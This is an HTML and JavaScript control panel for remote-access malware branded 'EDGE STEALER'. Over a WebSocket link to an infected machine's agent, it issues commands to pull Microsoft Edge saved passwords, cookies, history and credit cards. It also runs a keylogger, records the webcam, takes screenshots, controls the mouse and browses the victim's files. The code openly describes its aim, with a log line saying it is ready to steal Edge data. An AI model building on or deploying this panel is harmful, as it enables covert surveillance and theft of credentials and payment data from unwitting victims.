<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>REMOTE_OPS // V15_EDGE_STEALER</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        :root { --bg-color: #050505; --panel-bg: rgba(12, 14, 12, 0.98); --main-color: #00ff41; --accent-color: #00f7ff; --alert-color: #ff3333; --border: 1px solid #333; }
        * { box-sizing: border-box; }
        body { font-family: 'Share Tech Mono', monospace; background-color: var(--bg-color); color: var(--main-color); margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; user-select: none; }
        
        .header { padding: 8px 15px; border-bottom: 2px solid var(--main-color); background: #001100; display: flex; justify-content: space-between; align-items: center; height: 50px; }
        .brand { font-size: 22px; font-weight: bold; letter-spacing: 2px; } .brand span { color: var(--accent-color); }
        input, button, textarea { font-family: 'Share Tech Mono'; padding: 5px 10px; background: #000; color: var(--main-color); border: 1px solid var(--main-color); outline: none; transition: 0.2s; }
        button:hover { background: var(--main-color); color: #000; cursor: pointer; box-shadow: 0 0 10px var(--main-color); }
        .btn-red { border-color: var(--alert-color); color: var(--alert-color); }
        .btn-red:hover { background: var(--alert-color); color: #fff; }
        .btn-blue { border-color: #0088ff; color: #0088ff; }
        .btn-blue:hover { background: #0088ff; color: #fff; }

        .main-grid { display: grid; grid-template-columns: 340px 1fr; height: calc(100vh - 50px); }
        .panel { background: var(--panel-bg); border-right: var(--border); padding: 12px; display: flex; flex-direction: column; overflow: hidden; gap: 12px; }
        .right-panel { background: #000; display: flex; flex-direction: column; position: relative; overflow: hidden; }

        .tab-bar { display: flex; gap: 6px; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 8px; }
        .tab-btn { flex: 1; border: none; background: #111; color: #666; font-size: 11px; font-weight: bold; padding: 8px; }
        .tab-btn.active { background: var(--main-color); color: #000; }

        .ctrl-group { border: 1px dashed #333; padding: 12px; background: rgba(0,255,65,0.03); border-radius: 6px; }
        .ctrl-title { font-size: 11px; color: #0f0; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1.5px; font-weight: bold; }

        .btn-row { display: flex; gap: 6px; margin-top: 6px; }
        .btn-row button { flex: 1; font-size: 11px; padding: 10px; }

        .result-box {
            background: #000;
            border: 1px solid #333;
            color: #0f0;
            padding: 10px;
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            max-height: 200px;
            overflow-y: auto;
            margin-top: 8px;
            display: none;
            border-radius: 4px;
        }
        
        .edge-data-container {
            background: #000;
            border: 1px solid #333;
            color: #0f0;
            padding: 10px;
            font-family: 'Fira Code', monospace;
            font-size: 11px;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 8px;
            display: none;
            border-radius: 4px;
        }
        
        .copy-btn {
            margin-top: 6px;
            padding: 6px;
            font-size: 10px;
            background: #003300;
            border-color: #00ff41;
        }

        .preview-area { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; position: relative; overflow: hidden; }
        .preview-area img { max-width: 100%; max-height: 100%; object-fit: contain; cursor: crosshair; }
        #log-area { height: 30px; background: #000; border-top: 1px solid #333; padding: 5px 15px; font-size: 11px; color: #00ff41; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .hidden { display: none !important; }
        
        /* Tabs cho Edge data */
        .edge-tabs { display: flex; margin-bottom: 10px; border-bottom: 1px solid #333; }
        .edge-tab { padding: 8px 12px; background: #111; color: #666; cursor: pointer; font-size: 10px; }
        .edge-tab.active { background: #222; color: #0f0; border-bottom: 2px solid #0f0; }
        
        /* Tables cho Edge data */
        .edge-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 10px;
            margin-bottom: 10px;
        }
        .edge-table th {
            background: #001a00;
            color: #0f0;
            padding: 6px;
            text-align: left;
            border: 1px solid #333;
        }
        .edge-table td {
            padding: 6px;
            border: 1px solid #333;
            word-break: break-all;
        }
        .edge-table tr:hover {
            background: #001a00;
        }
        
        /* Loading indicator */
        .loading {
            color: #ff9900;
            font-style: italic;
        }
        
        /* Success/Error messages */
        .success { color: #00ff41; }
        .error { color: #ff3333; }
        .warning { color: #ff9900; }
    </style>
</head>
<body>

    <div class="header">
        <div class="brand">REMOTE<span>OPS</span> // EDGE STEALER</div>
        <div style="display:flex; gap:10px; align-items:center;">
            <input type="text" id="ip" value="ws://localhost:9010" style="width:220px;">
            <button onclick="connect()">CONNECT TARGET</button>
            <div id="connection-status" style="font-size:11px; color:#666;">Disconnected</div>
        </div>
    </div>

    <div class="main-grid">
        <div class="panel">
            <div class="tab-bar">
                <button class="tab-btn active" onclick="switchTab('control')">CONTROL</button>
                <button class="tab-btn" onclick="switchTab('edge')">EDGE DATA</button>
                <button class="tab-btn" onclick="switchTab('explorer')">EXPLORER</button>
            </div>

            <!-- TAB CONTROL -->
            <div id="tab-control">
                <div class="ctrl-group">
                    <div class="ctrl-title">REMOTE DESKTOP</div>
                    <button id="btn-remote" onclick="toggleRemote()" style="width:100%; padding:12px; font-weight:bold;">
                        START REMOTE CONTROL
                    </button>
                </div>

                <div class="ctrl-group">
                    <div class="ctrl-title">SURVEILLANCE</div>
                    <div class="btn-row">
                        <button onclick="takeScreenshot()">SCREENSHOT</button>
                        <button onclick="startWebcam()">WEBCAM REC</button>
                    </div>
                    <button class="btn-red" onclick="stopWebcam()" style="margin-top:6px">STOP & SAVE</button>
                </div>

                <div class="ctrl-group">
                    <div class="ctrl-title">KEYLOGGER</div>
                    <div class="btn-row">
                        <button onclick="send('KEYBOARD','START')">START REC</button>
                        <button class="btn-red" onclick="send('KEYBOARD','STOP')">STOP</button>
                    </div>
                    <textarea id="key-stream" class="result-box" readonly placeholder="> Keystrokes appear here..."></textarea>
                </div>
            </div>

            <!-- TAB EDGE STEALER -->
            <div id="tab-edge" class="hidden">
                <div class="ctrl-group">
                    <div class="ctrl-title">MICROSOFT EDGE DATA EXTRACTOR</div>
                    
                    <div class="btn-row">
                        <button onclick="getEdgeData('EXTRACT_ALL')" style="width:100%; padding:12px; font-weight:bold; background:#330000; border-color:#ff0066; color:#ff0066;">
                            EXTRACT ALL DATA
                        </button>
                    </div>
                    
                    <div class="btn-row">
                        <button onclick="getEdgeData('GET_PASSWORDS')" class="btn-blue" style="flex:1;">
                            PASSWORDS
                        </button>
                        <button onclick="getEdgeData('GET_COOKIES')" style="flex:1;">
                            COOKIES
                        </button>
                    </div>
                    
                    <div class="btn-row">
                        <button onclick="getEdgeData('GET_HISTORY')" style="flex:1;">
                            HISTORY
                        </button>
                        <button onclick="getEdgeData('GET_BOOKMARKS')" style="flex:1;">
                            BOOKMARKS
                        </button>
                    </div>
                    
                    <div class="btn-row">
                        <button onclick="getEdgeData('GET_CREDIT_CARDS')" style="flex:1; background:#220000; border-color:#ff3300; color:#ff3300;">
                            CREDIT CARDS
                        </button>
                        <button onclick="getEdgeData('TEST')" style="flex:1;">
                            TEST
                        </button>
                    </div>
                    
                    <!-- Progress bar -->
                    <div id="edge-progress" class="hidden" style="margin-top:10px;">
                        <div style="display:flex; justify-content:space-between; font-size:10px;">
                            <span>Extracting...</span>
                            <span id="progress-text">0%</span>
                        </div>
                        <div style="width:100%; height:4px; background:#333; margin-top:4px;">
                            <div id="progress-bar" style="width:0%; height:100%; background:#00ff41;"></div>
                        </div>
                    </div>
                    
                    <!-- Edge data display area -->
                    <div id="edge-data-display" class="edge-data-container">
                        <!-- Tabs for different data types -->
                        <div class="edge-tabs" id="edge-tabs"></div>
                        
                        <!-- Data tables -->
                        <div id="edge-passwords" class="edge-table-container hidden">
                            <table class="edge-table">
                                <thead>
                                    <tr>
                                        <th>URL</th>
                                        <th>Username</th>
                                        <th>Password</th>
                                    </tr>
                                </thead>
                                <tbody id="passwords-table"></tbody>
                            </table>
                        </div>
                        
                        <div id="edge-cookies" class="edge-table-container hidden">
                            <table class="edge-table">
                                <thead>
                                    <tr>
                                        <th>Domain</th>
                                        <th>Name</th>
                                        <th>Value</th>
                                    </tr>
                                </thead>
                                <tbody id="cookies-table"></tbody>
                            </table>
                        </div>
                        
                        <div id="edge-history" class="edge-table-container hidden">
                            <table class="edge-table">
                                <thead>
                                    <tr>
                                        <th>URL</th>
                                        <th>Title</th>
                                        <th>Visits</th>
                                    </tr>
                                </thead>
                                <tbody id="history-table"></tbody>
                            </table>
                        </div>
                        
                        <div id="edge-raw" class="edge-table-container">
                            <pre id="edge-raw-data"></pre>
                        </div>
                    </div>
                    
                    <div class="btn-row">
                        <button id="copy-edge" class="copy-btn" onclick="copyEdgeResult()" style="flex:1;">COPY RAW DATA</button>
                        <button class="copy-btn btn-red" onclick="clearEdgeData()" style="flex:1;">CLEAR</button>
                    </div>
                </div>
            </div>

            <!-- TAB EXPLORER -->
            <div id="tab-explorer" class="hidden">
                <button onclick="send('FILE','LIST_DIR',{path:''})" style="width:100%; padding:10px;">MY COMPUTER</button>
                <button onclick="refresh()" style="width:100%; margin-top:6px;">REFRESH DIR</button>
            </div>
        </div>

        <div class="right-panel">
            <div id="explorer-view" class="hidden" style="height:100%; display:flex; flex-direction:column;">
                <div style="background:#111; padding:10px; color:#aaa; border-bottom:1px solid #333;" id="breadcrumbs">Not connected</div>
                <div class="file-grid" id="file-grid" style="flex-grow:1; overflow:auto; padding:15px; display:grid; grid-template-columns:repeat(auto-fill,minmax(90px,1fr)); gap:12px;"></div>
            </div>

            <div id="media-view" class="preview-area">
                <div id="view-label" style="position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.8); padding:5px 10px; font-size:12px; border-radius:4px; z-index:10;">IDLE</div>
                <img id="main-view" alt="Stream">
            </div>

            <div id="log-area">> Waiting for connection...</div>
        </div>
    </div>

<script>
    let ws = null;
    let isRemoteControl = false;
    let isStreaming = false;
    let lastMouseSend = 0;
    let edgeDataChunks = [];
    let expectedEdgeChunks = 0;
    let receivedEdgeChunks = 0;
    let currentEdgeCommand = '';

    // Edge data state
    let edgePasswords = [];
    let edgeCookies = [];
    let edgeHistory = [];
    let edgeBookmarks = [];
    let edgeCreditCards = [];

    function connect() {
        const url = document.getElementById('ip').value.trim();
        if (!url) return alert("Enter WebSocket URL");
        
        ws = new WebSocket(url);
        ws.binaryType = "arraybuffer";
        ws.onopen = () => {
            log("CONNECTED – Ready to steal Edge data");
            document.getElementById('connection-status').textContent = "Connected";
            document.getElementById('connection-status').style.color = "#00ff41";
        };
        ws.onmessage = handleMessage;
        ws.onclose = () => {
            log("DISCONNECTED");
            document.getElementById('connection-status').textContent = "Disconnected";
            document.getElementById('connection-status').style.color = "#ff3333";
        };
        ws.onerror = (err) => {
            log("Connection error: " + err);
        };
    }

    function send(mod, cmd, payload = {}) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            const request = { module: mod, command: cmd, payload };
            console.log("Sending:", request);
            ws.send(JSON.stringify(request));
        } else {
            log("ERROR: Not connected to server");
        }
    }

    function log(msg) {
        const d = new Date().toLocaleTimeString();
        document.getElementById('log-area').textContent = `[${d}] ${msg}`;
        console.log(`[LOG] ${msg}`);
    }

    // === CHỨC NĂNG EDGE STEALER ===
    function getEdgeData(action) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            alert("Please connect to server first!");
            return;
        }
        
        currentEdgeCommand = action;
        edgeDataChunks = [];
        expectedEdgeChunks = 0;
        receivedEdgeChunks = 0;
        
        // Reset UI
        document.getElementById('edge-data-display').style.display = 'block';
        document.getElementById('edge-progress').classList.remove('hidden');
        document.getElementById('progress-bar').style.width = '0%';
        document.getElementById('progress-text').textContent = '0%';
        
        // Show raw data area
        document.getElementById('edge-raw').classList.remove('hidden');
        document.getElementById('edge-raw-data').textContent = '> Requesting Edge data: ' + action + ' ...\n';
        
        // Hide other tables
        document.querySelectorAll('.edge-table-container').forEach(el => {
            if (el.id !== 'edge-raw') el.classList.add('hidden');
        });
        
        send('EDGE', action);
    }

    function handleEdgeChunk(chunkMsg) {
        if (chunkMsg.status === 'start') {
            expectedEdgeChunks = chunkMsg.total_chunks || 1;
            receivedEdgeChunks = 0;
            edgeDataChunks = [];
            log(`Edge data: ${expectedEdgeChunks} chunks expected`);
        }
        else if (chunkMsg.status === 'chunk') {
            edgeDataChunks.push(chunkMsg.data);
            receivedEdgeChunks++;
            
            // Update progress
            const progress = Math.round((receivedEdgeChunks / expectedEdgeChunks) * 100);
            document.getElementById('progress-bar').style.width = progress + '%';
            document.getElementById('progress-text').textContent = progress + '%';
            
            log(`Edge chunk ${receivedEdgeChunks}/${expectedEdgeChunks} received`);
            
            if (chunkMsg.is_last) {
                // All chunks received
                const fullData = edgeDataChunks.join('');
                processEdgeData(fullData);
                document.getElementById('edge-progress').classList.add('hidden');
            }
        }
    }

    function processEdgeData(dataStr) {
        try {
            const data = JSON.parse(dataStr);
            
            // Update raw display
            document.getElementById('edge-raw-data').textContent = JSON.stringify(data, null, 2);
            
            // Process based on data structure
            if (data.passwords && Array.isArray(data.passwords)) {
                edgePasswords = data.passwords;
                updatePasswordsTable();
            }
            
            if (data.cookies && Array.isArray(data.cookies)) {
                edgeCookies = data.cookies;
                updateCookiesTable();
            }
            
            if (data.history && Array.isArray(data.history)) {
                edgeHistory = data.history;
                updateHistoryTable();
            }
            
            if (data.bookmarks && Array.isArray(data.bookmarks)) {
                edgeBookmarks = data.bookmarks;
            }
            
            if (data.credit_cards && Array.isArray(data.credit_cards)) {
                edgeCreditCards = data.credit_cards;
            }
            
            // Update tabs
            updateEdgeTabs();
            
            log(`Edge data processed: ${edgePasswords.length} passwords, ${edgeCookies.length} cookies, ${edgeHistory.length} history entries`);
            
        } catch (err) {
            console.error("Error parsing Edge data:", err);
            document.getElementById('edge-raw-data').textContent = "ERROR parsing data: " + err.message + "\n\nRaw data:\n" + dataStr;
        }
    }

    function updateEdgeTabs() {
        const tabsContainer = document.getElementById('edge-tabs');
        tabsContainer.innerHTML = '';
        
        const tabs = [
            { id: 'edge-raw', label: 'Raw Data', count: '' },
            { id: 'edge-passwords', label: 'Passwords', count: edgePasswords.length },
            { id: 'edge-cookies', label: 'Cookies', count: edgeCookies.length },
            { id: 'edge-history', label: 'History', count: edgeHistory.length }
        ];
        
        tabs.forEach(tab => {
            const tabEl = document.createElement('div');
            tabEl.className = 'edge-tab';
            if (tab.id === 'edge-raw') tabEl.classList.add('active');
            tabEl.textContent = `${tab.label} (${tab.count})`;
            tabEl.onclick = () => switchEdgeTab(tab.id);
            tabsContainer.appendChild(tabEl);
        });
    }

    function switchEdgeTab(tabId) {
        // Hide all tables
        document.querySelectorAll('.edge-table-container').forEach(el => {
            el.classList.add('hidden');
        });
        
        // Show selected tab
        document.getElementById(tabId).classList.remove('hidden');
        
        // Update active tab
        document.querySelectorAll('.edge-tab').forEach(tab => {
            tab.classList.remove('active');
        });
        event.target.classList.add('active');
    }

    function updatePasswordsTable() {
        const tbody = document.getElementById('passwords-table');
        tbody.innerHTML = '';
        
        edgePasswords.forEach(item => {
            const tr = document.createElement('tr');
            
            const urlTd = document.createElement('td');
            urlTd.textContent = item.url || item.origin_url || '[No URL]';
            
            const userTd = document.createElement('td');
            userTd.textContent = item.username || item.username_value || '[No username]';
            
            const passTd = document.createElement('td');
            passTd.textContent = item.password || item.password_value || '[No password]';
            if (passTd.textContent.includes('[ENCRYPTED]') || passTd.textContent.includes('[DECRYPT')) {
                passTd.className = 'warning';
            }
            
            tr.appendChild(urlTd);
            tr.appendChild(userTd);
            tr.appendChild(passTd);
            tbody.appendChild(tr);
        });
    }

    function updateCookiesTable() {
        const tbody = document.getElementById('cookies-table');
        tbody.innerHTML = '';
        
        edgeCookies.slice(0, 50).forEach(item => { // Limit to 50 for performance
            const tr = document.createElement('tr');
            
            const domainTd = document.createElement('td');
            domainTd.textContent = item.host || item.host_key || '[No domain]';
            
            const nameTd = document.createElement('td');
            nameTd.textContent = item.name || '[No name]';
            
            const valueTd = document.createElement('td');
            valueTd.textContent = item.value || '[No value]';
            if (valueTd.textContent.length > 50) {
                valueTd.textContent = valueTd.textContent.substring(0, 50) + '...';
            }
            
            tr.appendChild(domainTd);
            tr.appendChild(nameTd);
            tr.appendChild(valueTd);
            tbody.appendChild(tr);
        });
        
        if (edgeCookies.length > 50) {
            const tr = document.createElement('tr');
            const td = document.createElement('td');
            td.colSpan = 3;
            td.textContent = `... and ${edgeCookies.length - 50} more cookies`;
            td.className = 'warning';
            tr.appendChild(td);
            tbody.appendChild(tr);
        }
    }

    function updateHistoryTable() {
        const tbody = document.getElementById('history-table');
        tbody.innerHTML = '';
        
        edgeHistory.slice(0, 50).forEach(item => { // Limit to 50
            const tr = document.createElement('tr');
            
            const urlTd = document.createElement('td');
            urlTd.textContent = item.url || '[No URL]';
            if (urlTd.textContent.length > 40) {
                urlTd.textContent = urlTd.textContent.substring(0, 40) + '...';
            }
            
            const titleTd = document.createElement('td');
            titleTd.textContent = item.title || '[No title]';
            if (titleTd.textContent.length > 30) {
                titleTd.textContent = titleTd.textContent.substring(0, 30) + '...';
            }
            
            const visitsTd = document.createElement('td');
            visitsTd.textContent = item.visits || item.visit_count || '0';
            
            tr.appendChild(urlTd);
            tr.appendChild(titleTd);
            tr.appendChild(visitsTd);
            tbody.appendChild(tr);
        });
    }

    function copyEdgeResult() {
        const text = document.getElementById('edge-raw-data').textContent;
        navigator.clipboard.writeText(text).then(() => {
            alert("Edge data copied to clipboard!");
        });
    }

    function clearEdgeData() {
        edgePasswords = [];
        edgeCookies = [];
        edgeHistory = [];
        edgeBookmarks = [];
        edgeCreditCards = [];
        
        document.getElementById('edge-raw-data').textContent = '';
        document.getElementById('passwords-table').innerHTML = '';
        document.getElementById('cookies-table').innerHTML = '';
        document.getElementById('history-table').innerHTML = '';
        document.getElementById('edge-tabs').innerHTML = '';
        
        log("Edge data cleared");
    }

    function handleMessage(e) {
        console.log("Received message type:", typeof e.data);
        
        // Handle binary data (screenshots, webcam)
        if (e.data instanceof ArrayBuffer) {
            const blob = new Blob([e.data], { type: 'image/jpeg' });
            const url = URL.createObjectURL(blob);
            document.getElementById('main-view').src = url;
            if (isStreaming) {
                // Request next frame if streaming
                setTimeout(() => send('SCREEN','CAPTURE_BINARY',{save:false}), 50);
            }
            return;
        }

        try {
            // Handle text/JSON data
            const res = JSON.parse(e.data);
            console.log("Parsed JSON response:", res);

            // Check if this is a chunked Edge response
            if (res.module === 'EDGE' && (res.status === 'start' || res.status === 'chunk')) {
                handleEdgeChunk(res);
                return;
            }

            // Handle regular Edge responses
            if (res.module === 'EDGE') {
                document.getElementById('edge-data-display').style.display = 'block';
                document.getElementById('edge-progress').classList.add('hidden');
                
                if (res.data) {
                    processEdgeData(JSON.stringify(res.data));
                } else {
                    processEdgeData(JSON.stringify(res));
                }
                
                log(`EDGE ${res.command} – Received ${edgePasswords.length} passwords, ${edgeCookies.length} cookies`);
                return;
            }

            // Handle keyboard data
            if (res.module === 'KEYBOARD') {
                const box = document.getElementById('key-stream');
                box.style.display = 'block';
                box.value += res.data?.key || '';
                box.scrollTop = box.scrollHeight;
            }

            // Handle other modules
            if (res.status === 'success') {
                log(`${res.module} ${res.command} – Success`);
            } else if (res.status === 'error') {
                log(`ERROR: ${res.module} ${res.command} – ${res.message}`);
            }

        } catch(err) {
            console.error("Error parsing message:", err, "Raw data:", e.data);
        }
    }

    // ========== CÁC HÀM KHÁC (giữ nguyên) ==========
    function switchTab(tab) {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelector(`button[onclick="switchTab('${tab}')"]`).classList.add('active');

        document.getElementById('tab-control').classList.add('hidden');
        document.getElementById('tab-edge').classList.add('hidden');
        document.getElementById('tab-explorer').classList.add('hidden');
        document.getElementById('explorer-view').classList.add('hidden');
        document.getElementById('media-view').classList.add('hidden');

        if (tab === 'edge') {
            document.getElementById('tab-edge').classList.remove('hidden');
            document.getElementById('media-view').classList.remove('hidden');
        } else if (tab === 'explorer') {
            document.getElementById('tab-explorer').classList.remove('hidden');
            document.getElementById('explorer-view').classList.remove('hidden');
        } else {
            document.getElementById('tab-control').classList.remove('hidden');
            document.getElementById('media-view').classList.remove('hidden');
        }
    }

    function toggleRemote() {
        isRemoteControl = !isRemoteControl;
        const btn = document.getElementById('btn-remote');
        const img = document.getElementById('main-view');
        if (isRemoteControl) {
            btn.textContent = "STOP REMOTE";
            btn.style.background = '#330000';
            btn.style.borderColor = '#ff0066';
            img.style.cursor = 'crosshair';
            isStreaming = true;
            send('SCREEN','CAPTURE_BINARY',{save:false});
            img.onmousemove = e => {
                if (Date.now() - lastMouseSend < 40) return;
                lastMouseSend = Date.now();
                const r = img.getBoundingClientRect();
                const x = (e.clientX - r.left) / r.width;
                const y = (e.clientY - r.top) / r.height;
                if (x >=0 && x <=1 && y >=0 && y <=1) {
                    send('INPUT', 'MOUSE_MOVE', {x, y});
                }
            };
            img.onmousedown = e => send('INPUT','MOUSE_BTN',{x:0,y:0,btn:e.button===0?'left':e.button===2?'right':'middle',type:'down'});
            img.onmouseup = e => send('INPUT','MOUSE_BTN',{x:0,y:0,btn:e.button===0?'left':e.button===2?'right':'middle',type:'up'});
        } else {
            btn.textContent = "START REMOTE CONTROL";
            btn.style.background = '';
            img.style.cursor = 'default';
            isStreaming = false;
            img.onmousemove = img.onmousedown = img.onmouseup = null;
        }
    }

    function takeScreenshot() { 
        send('SCREEN','CAPTURE_BINARY',{save:true}); 
        switchTab('control'); 
    }
    
    function startWebcam() { 
        send('WEBCAM','START_STREAM'); 
    }
    
    function stopWebcam() { 
        send('WEBCAM','STOP_STREAM'); 
    }
</script>
</body>
</html>